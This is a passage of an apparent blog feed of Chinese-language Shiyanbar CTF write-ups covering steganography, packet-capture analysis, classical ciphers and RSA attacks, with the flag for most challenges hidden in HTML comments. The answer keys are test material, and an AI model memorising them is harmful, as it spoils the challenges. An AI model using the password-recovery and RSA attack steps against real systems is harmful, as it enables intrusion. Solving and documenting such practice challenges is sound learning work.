src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/07-01.png" alt="" title="" class="">                <p></p>            </figure><br>扫码得到flag<br><!--flag{AppLeU0}--></p><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>lsb隐写，使用wbStego4.3open解码<br><!--SimCTF{LSB_yinxie}--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验吧 </tag>
            
            <tag> STEGA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-Misc-writeup</title>
      <link href="/2018/05/09/%E5%AE%9E%E9%AA%8C%E5%90%A7-Misc-writeup/"/>
      <url>/2018/05/09/%E5%AE%9E%E9%AA%8C%E5%90%A7-Misc-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>实验吧Misc题writeup</p></blockquote><a id="more"></a><h1 id="图片里的动漫"><a href="#图片里的动漫" class="headerlink" title="图片里的动漫"></a>图片里的动漫</h1><p>下载图片，后缀改为rar，打开发现flag.rar；解压出来，将flag.rar后缀改为jpg<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/01-01.png" alt="" title="" class="">                <p></p>            </figure><br>七龙珠英文是：DRAGON BALL<br>提交提示错误，因为图片是倒置的，此时把英文反过来写llabnogard,<br><!--CTF{llabnogard}--></p><h1 id="这是捕获的黑客攻击数据包，"><a href="#这是捕获的黑客攻击数据包，" class="headerlink" title="这是捕获的黑客攻击数据包，"></a>这是捕获的黑客攻击数据包，</h1><p>Administrator用户的密码在此次攻击中泄露了，你能找到吗？<br>http过滤数据包，密码应该在数据包前半部分，所以从头开始看post数据包，将每个数据包中的base64依次解码，直到找到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/02-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/02-02.png" alt="" title="" class="">                <p></p>            </figure></p><p style="display:none;">Test!@#123</p><h1 id="抓到你了"><a href="#抓到你了" class="headerlink" title="抓到你了"></a>抓到你了</h1><p>Hint：入侵者通过 ping 工具对局域网内一主机进行存活性扫描， flag 为入侵所 发送的 16 字节的数据包内容。<br>提示很明显，ping也就是icmp协议，过滤icmp，找到flag,不要带冒号<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/03-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--2122232425262728292a2b2c2d2e2f30--></p><h1 id="紧急报文"><a href="#紧急报文" class="headerlink" title="紧急报文"></a>紧急报文</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解密一下这份截获的密文吧，时间就是机会！</span><br><span class="line">FA XX DD AG FF XG FD XG DD DG GA XF FA</span><br><span class="line">flag格式:flag_Xd&#123;hSh_ctf:******&#125;</span><br></pre></td></tr></table></figure><p>ADFGX密码,对表得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/04-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag_Xd{hSh_ctf:flagxidianctf}--></p><h1 id="MD5之守株待兔，你需要找到和系统锁匹配的钥匙"><a href="#MD5之守株待兔，你需要找到和系统锁匹配的钥匙" class="headerlink" title="MD5之守株待兔，你需要找到和系统锁匹配的钥匙"></a>MD5之守株待兔，你需要找到和系统锁匹配的钥匙</h1><p>根据提示访问<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/misc/keys/keys.php?key=123</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/05-01.png" alt="" title="" class="">                <p></p>            </figure><p>MD5解密<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/05-02.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/05-03.png" alt="" title="" class="">                <p></p>            </figure><br><a href="http://tool.chinaz.com/Tools/unixtime.aspx" target="_blank" rel="noopener">站长之家</a>查看unix时间戳<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/05-04.png" alt="" title="" class="">                <p></p>            </figure><br>所以这题就是要key值等于服务器系统时间戳的md5值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time,requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/misc/keys/keys.php?key='</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    Time = str(int(time.time())) <span class="comment">#获取unix时间戳并转换成字符</span></span><br><span class="line">    req = s.get(url+Time)</span><br><span class="line">    req.encoding=<span class="string">'gbk'</span></span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><p>受到网络延迟影响，不是每次执行都可以成功，多试几次得到flag，格式CTF{}<br><!--CTF{c04ffec18156c696}--></p><h1 id="女神"><a href="#女神" class="headerlink" title="女神"></a>女神</h1><p>base64转Binary<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/06-01.png" alt="" title="" class="">                <p></p>            </figure><br>但是并不认识emmm…<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Misc-1/06-02.png" alt="" title="" class="">                <p></p>            </figure><br><!--爱新觉罗启星--></p><h1 id="内网攻击数据包，请分析"><a href="#内网攻击数据包，请分析" class="headerlink" title="内网攻击数据包，请分析"></a>内网攻击数据包，请分析</h1><p>SMB包里找到hash和challange。<br><a href="http://hebin.me/2017/09/09/%E8%A5%BF%E6%99%AEctf-%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E8%AF%B7%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">解题思路</a><br><!--NetLMis666--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> 实验吧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-Crypto-writeup</title>
      <link href="/2018/05/09/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-writeup/"/>
      <url>/2018/05/09/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>实验吧密码类题目,</p></blockquote><a id="more"></a><h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密密文：afZ_r9VYfScOeO_UL^RWUc</span></span><br><span class="line"><span class="comment"># 规律：'afz_'+'5678'='flag'</span></span><br><span class="line">Crypto = <span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span></span><br><span class="line">Crypto = list(Crypto)</span><br><span class="line">list1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Crypto:</span><br><span class="line">    list1.append(ord(i))</span><br><span class="line"></span><br><span class="line">num = <span class="number">5</span></span><br><span class="line">list2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    i += num</span><br><span class="line">    list2.append(i)</span><br><span class="line">    num +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:</span><br><span class="line">    flag += chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><!--flag{Caesar_variation}--><h1 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h1><p>小明某一天收到一封密信，信中写了几个不同的年份<br>          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。<br>          信的背面还写有“+甲子”，请解出这段密文。<br>key值：CTF{XXX}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">辛卯，顺序为第28个 + 甲子(60) --&gt; 88 --&gt;  X</span><br><span class="line">癸巳，顺序为第30个 + 甲子(60) --&gt; 90 --&gt;  Z</span><br><span class="line">丙戌，顺序为第23个 + 甲子(60) --&gt; 93 --&gt;  S</span><br><span class="line">辛未，顺序为第8个 + 甲子(60) --&gt; 68 --&gt;  D</span><br><span class="line">庚辰，顺序为第17个 + 甲子(60) --&gt; 77 --&gt;  M</span><br><span class="line">癸酉，顺序为第10个 + 甲子(60) --&gt; 70 --&gt;  F</span><br><span class="line">己卯，顺序为第16个 + 甲子(60) --&gt; 76 --&gt;  L</span><br><span class="line">癸巳，顺序为第30个 + 甲子(60) --&gt; 90 --&gt;  Z</span><br></pre></td></tr></table></figure></p><p>加上一个甲子即60：88    90    93    68    77    70    76    90<br>转换成ASCII字母：XZSDMFLZ<br>栅栏密码（两栏）：XMZFSLDZ<br>凯撒：SHUANGYU<br>最后按格式提交CTF{xxxxxxxx}即可<br><!--CTF{SHUANGYU}--></p><h1 id="what’s-wrong-with-this"><a href="#what’s-wrong-with-this" class="headerlink" title="what’s wrong with this"></a>what’s wrong with this</h1><p>传送门：<a href="http://hebin.me/wp-content/uploads/2017/09/2017090715264378.pdf" target="_blank" rel="noopener">whats-wrong-with-this</a><br><!--modified_in7erpreters_are_3vil!!!--></p><h1 id="try-them-all"><a href="#try-them-all" class="headerlink" title="try them all"></a>try them all</h1><p>md5爆破：<a href="https://www.somd5.com/" target="_blank" rel="noopener">somd5</a>,去掉数字就是flag<br><!--sniper--></p><h1 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h1><p>别人的Python2脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">t = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="comment"># returns d such that e * d == 1 modulo t, or 0 if no such y exists.</span></span><br><span class="line">d = gmpy2.invert(e,t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decryption</span></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Solved ! m = %d"</span> % m</span><br></pre></td></tr></table></figure></p><!--5577446633554466577768879988--><h1 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h1><p>用音频软件打开看不出来，得用听得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure></p><!--BOOPBEEP--><h1 id="The-Flash-14"><a href="#The-Flash-14" class="headerlink" title="The Flash-14"></a>The Flash-14</h1><p>闪电侠第二季14集的密码表<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/2018-09-04-21-52-59.png" alt="5*5密码表" title="" class="">                <p>5*5密码表</p>            </figure><br>凯撒解密得到flag<br><!--ctf{flashisfastman}--></p><h1 id="奇怪的短信"><a href="#奇怪的短信" class="headerlink" title="奇怪的短信"></a>奇怪的短信</h1><p>收到一条奇怪的短信:<br>          335321414374744361715332<br>          你能帮我解出隐藏的内容嘛？！<br>格式：CTF{xxx}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打开手机9宫格输入法，两个一组，例如21=a，22=b</span><br><span class="line">33 53 21 41 43 74 74 43 61 71 53 32</span><br><span class="line">f  l  a  g  i  s  s  i  m  p  l  e</span><br></pre></td></tr></table></figure></p><!--CTF{flagissimple}--><h1 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h1><h2 id="逆推解法"><a href="#逆推解法" class="headerlink" title="逆推解法"></a>逆推解法</h2><p>先分解n<code>920139713</code>得到<code>18443</code>,<code>49891</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p,q,N,e = <span class="number">18443</span>,<span class="number">49891</span>,<span class="number">920139713</span>,<span class="number">19</span></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"RSAROll.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.readline()</span><br><span class="line">    f.readline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        flag.append(chr(pow(int(i),d,N)))</span><br><span class="line">print(<span class="string">""</span>.join(flag))</span><br></pre></td></tr></table></figure></p><h2 id="爆破解法"><a href="#爆破解法" class="headerlink" title="爆破解法"></a>爆破解法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n,e,dic,flag = <span class="number">920139713</span>,<span class="number">19</span>,&#123;&#125;,<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">    dic[str(i**e%n)] = chr(i)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"RSAROLL.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.readline()</span><br><span class="line">    f.readline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        flag += dic[i.replace(<span class="string">'\n'</span>,<span class="string">''</span>)]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><!--flag{13212je2ue28fy71w8u87y31r78eu1e2}--><p>参考：<a href="http://hebin.me/2017/09/07/%E8%A5%BF%E6%99%AEctf-rsaroll/" target="_blank" rel="noopener">西普CTF-RSAROLL</a></p><h1 id="围在栅栏中的爱"><a href="#围在栅栏中的爱" class="headerlink" title="围在栅栏中的爱"></a>围在栅栏中的爱</h1><p> 最近一直在好奇一个问题，QWE到底等不等于ABC？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---</span><br></pre></td></tr></table></figure></p><p>flag格式：CTF{xxx}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">摩斯电码解密：kiqlwtfcqgnsoo</span><br><span class="line">看下你的键盘qwe=abc，所以：</span><br><span class="line">qwertyuiopasdfghjklzxcvbnm</span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">rhasbenvaoylii</span><br><span class="line">栅栏解密，爱呢？</span><br><span class="line">rh as be nv ao yl ii</span><br><span class="line">rabnayihsevoli</span><br><span class="line">反过来看？嗯，爱在这里</span><br><span class="line">iloveshiyanbar</span><br></pre></td></tr></table></figure></p><!--CTF{iloveshiyanbar}--><h1 id="神秘字母"><a href="#神秘字母" class="headerlink" title="神秘字母"></a>神秘字母</h1><p>不会，走你：<a href="http://hebin.me/2017/09/07/%E8%A5%BF%E6%99%AEctf-%E7%A5%9E%E7%A7%98%E5%AD%97%E6%AF%8D/" target="_blank" rel="noopener">http://hebin.me/2017/09/07/西普ctf-神秘字母/</a><br><!--simCTF{hillissoeasy}--></p><h1 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h1><p>现有一段经过加密的密文，内容如下：王夫 井工 夫口 由中人 井中 夫夫 由中大。请找出这段密文隐藏的消息明文。<br>格式：CTF{ }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当铺密码</span><br><span class="line">就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。</span><br><span class="line">王夫 井工 夫口 由中人 井中 夫夫 由中大</span><br><span class="line">67   84   70    123    82   77   125</span><br><span class="line">ascii转换得到flag</span><br></pre></td></tr></table></figure></p><!--CTF{RM}--><h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}<br>请对其进行解密<br>提示：1.加解密方法就在谜面中，2.利用key值的固定结构</p><p>解题思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65</span><br><span class="line">ASCII得到：O C U &#123; C F T E L X O U Y D E C T N G A H O H R N F I E N M &#125; I O T A</span><br><span class="line">根据第二点，注意格式CTF&#123; &#125;</span><br><span class="line">OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA</span><br><span class="line">CTF&#123;                              &#125;</span><br><span class="line"></span><br><span class="line">O C U &#123; C F T</span><br><span class="line">E L X O U Y D</span><br><span class="line">E C T N G A H</span><br><span class="line">O H R N F I E</span><br><span class="line">N M &#125; I O T A</span><br><span class="line"></span><br><span class="line">OCU&#123;CFT ELXOUYD ECTNGAH OHRNFIE NM&#125;IOTA</span><br><span class="line">1234567 1234567 1234567 1234567 1234567</span><br><span class="line">CTF&#123;COU LDY0UEX CHANGET HEINFOR MATION&#125;</span><br><span class="line">2764513 2764513 2764513 2764513 2764513</span><br></pre></td></tr></table></figure></p><!--CTF{COULDY0UEXCHANGETHEINFORMATION}--><h1 id="困在栅栏里的凯撒"><a href="#困在栅栏里的凯撒" class="headerlink" title="困在栅栏里的凯撒"></a>困在栅栏里的凯撒</h1><p>小白发现了一段很6的字符：NlEyQd{seft}<br>注意大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">A B C D E</span><br><span class="line">F G H I J</span><br><span class="line">K L M N O</span><br><span class="line">P Q R S T</span><br><span class="line">U V W X Y Z</span><br><span class="line"></span><br><span class="line">C T  F&#123; &#125;</span><br><span class="line">3 20 6</span><br><span class="line"></span><br><span class="line">Nl Ey Qd &#123;s ef t&#125;</span><br><span class="line">NEQ&#123;et</span><br><span class="line">lydsf&#125;</span><br><span class="line"></span><br><span class="line">N  E  Q  &#123;  e  t  l  y  d  s  f  &#125;</span><br><span class="line">14 5  17    5  20 12 25 4  19 6</span><br><span class="line">C  T  F  &#123;  t  i  a  n  s  h  u  &#125;</span><br><span class="line">3  20 6     20 9  1  14 19 8  21</span><br></pre></td></tr></table></figure></p><!--CTF{tianshu}--><h1 id="奇妙的音乐"><a href="#奇妙的音乐" class="headerlink" title="奇妙的音乐"></a>奇妙的音乐</h1><p>据说flag就藏在这段音乐中，请仔细听。<br>格式：CTF{}<br>照片中下面盲文对应密码:kmdonowg<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/14-01.jpg" alt="" title="" class="">                <p></p>            </figure><br>用音频软件打开得出摩斯密码,听力好可以自己听…<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/14-02.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-./-/..-./.--/.--././../-----/---../--.../...--/..---/..--../..---/...--/-../--../</span><br></pre></td></tr></table></figure></p><p>莫斯电码解密，注意格式以及小写<br><!--CTF{wpei08732?23dz}--></p><h1 id="Fair-Play"><a href="#Fair-Play" class="headerlink" title="Fair-Play"></a>Fair-Play</h1><p>提示Fair-Play，应该是普莱菲尔密码,密钥在给出的句子中。<br>参考：<a href="https://baike.baidu.com/item/playfair%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">playfair密码</a><br>The quick brown fox jumps over the lazy dog!<br>去掉重复字母，ij视为同一个，组成5x5矩阵<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t   h e q u</span><br><span class="line">i/j c k b r</span><br><span class="line">o   w n f x</span><br><span class="line">m   p s v l</span><br><span class="line">a   z y d g</span><br><span class="line">按照加密方法逆向解密，同列这里向左移，不同列矩阵替换得到flag</span><br><span class="line">ih xo &#123;sm zd od ci km od ci sm zd&#125;</span><br><span class="line">cf fx &#123;pl ay fa ir is fa ir pl ay&#125;</span><br></pre></td></tr></table></figure></p><p>在线<a href="http://ctf.ssleye.com/playfair.html" target="_blank" rel="noopener">普莱费尔密码解密</a>，需要将矩阵生成<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/03-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--ctfx{playfairisfairplay}--></p><h1 id="我喜欢培根"><a href="#我喜欢培根" class="headerlink" title="我喜欢培根"></a>我喜欢培根</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -..</span><br><span class="line">摩斯电码解密</span><br><span class="line">MORSE..--.-IS..--.-COOL..--.-BUT..--.-BACON..--.-IS..--.-COOLER..--.-DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCC/CDCCCDCCDC/CCCDCCDDDCCDDDCCDCDD</span><br><span class="line">摩斯.. -。-是。-。-酷..。但.. -。-培根.. -。-是。-。-冷..。—</span><br><span class="line"></span><br><span class="line">培根密码：</span><br><span class="line">A aaaaa  B aaaab  C aaaba  D aaabb  E aabaa  F aabab  G aabba  H aabbb  I abaaa  J abaab</span><br><span class="line">K ababa  L ababb  M abbaa  N abbab  O abbba  P abbbb  Q baaaa  R baaab  S baaba  T baabb</span><br><span class="line">U babaa  V babab  W babba  X babbb  Y bbaaa  Z bbaab</span><br><span class="line"></span><br><span class="line">DCCDC CCDDD CDCCC DDCCC CCCCC CDDCD CCCCD CCCCC/CDCCC DCCDC/CCCDC CDDDC CDDDC CDCDD</span><br><span class="line">baaba aabbb abaaa bbaaa aaaaa abbab aaaab aaaaa/abaaa baaba/aaaba abbba abbba ababb</span><br><span class="line">s     h     i     y     a     n     b     a     i     s     c     o     o     l</span><br></pre></td></tr></table></figure><p>注意格式：CTF{xxxxxxxx&nbsp;xx&nbsp;xxxx}<br><!--CTF{SHIYANBA IS COOL}--></p><h1 id="Strength"><a href="#Strength" class="headerlink" title="Strength"></a>Strength</h1><p>N都是一样的，应该是RSA公模攻击，首先找个两个互为素数的e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PanDuan</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        a = e[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(e)):</span><br><span class="line">            b = e[j]</span><br><span class="line">            <span class="comment"># print(i,j)</span></span><br><span class="line">            a = a.replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">            b = b.replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(int(a,<span class="number">16</span>),int(b,<span 